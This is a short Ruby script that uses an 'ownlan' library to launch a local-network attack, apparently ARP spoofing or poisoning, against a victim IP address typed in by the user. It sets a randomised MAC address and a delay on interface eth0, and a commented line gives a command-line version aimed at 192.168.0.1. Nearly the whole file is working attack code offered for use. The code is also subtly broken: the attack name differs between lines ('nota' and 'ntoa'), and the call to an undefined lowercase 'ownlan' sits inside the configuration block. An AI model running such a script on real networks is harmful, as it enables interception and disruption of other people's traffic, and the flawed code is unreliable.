
require 'ownlan'

puts "Enter The IP Address ==> "
name = gets

Ownlan.configure do |config|
  config.attack = 'nota'
  config.vict = name
  config.delay = 1.5
  config.random_mac = 'true'
  config.int = 'eth0'

  ownlan.call




end



# ya can try it from cli

#ownlan = Ownlan.new(attack: 'ntoa', victim_ip: '192.168.0.1', delay: 1.5, random_mac: true)



